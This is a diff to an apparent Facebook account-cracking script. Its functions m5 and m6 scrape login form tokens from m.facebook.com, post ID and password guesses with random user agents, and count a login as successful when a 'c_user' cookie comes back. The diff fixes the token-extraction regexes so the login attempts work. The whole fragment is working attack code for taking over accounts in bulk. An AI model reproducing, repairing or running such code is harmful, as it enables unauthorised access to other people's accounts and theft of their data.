@@ -1164,7 +1164,8 @@ def m5(idf,pwv):
    pro = random.choice(ugen)
    free_fb = session.get(f'https://m.facebook.com').text
    log_data = {
-    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   'charset_test':re.search('name="charset_test" value="(.*?)"', str(free_fb)).group(1),
    "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
    "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
    "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
@@ -1180,7 +1181,6 @@ def m5(idf,pwv):
    'accept-encoding': 'gzip, deflate, br, zstd',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7'
    'cookies': 'queen_bithika'}
-  #'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',}
    lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data,headers=head).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
@@ -1228,18 +1228,17 @@ def m6(idf,pwv):
    pro = random.choice(ugen)
    free_fb = session.get('https://m.facebook.com').text
    log_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "csettest":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "version":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "ajax":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "width":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "pxr":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "gps":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "m_ts":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "li":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+   "charset_test":re.search('name="charset_test" value="(.*?)"', str(free_fb)).group(1),
+   "version":re.search('name="version" value="(.*?)"', str(free_fb)).group(1),
+   "ajax":re.search('name="ajax" value="(.*?)"', str(free_fb)).group(1),
+   "width":re.search('name="width" value="(.*?)"', str(free_fb)).group(1),
+   "pxr":re.search('name="pxr" value="(.*?)"', str(free_fb)).group(1),
+   "gps":re.search('name="gps" value="(.*?)"', str(free_fb)).group(1),
+   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
    "email":idf,
    "pass":pw,
    "login":"Log In"} 
- 
    lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
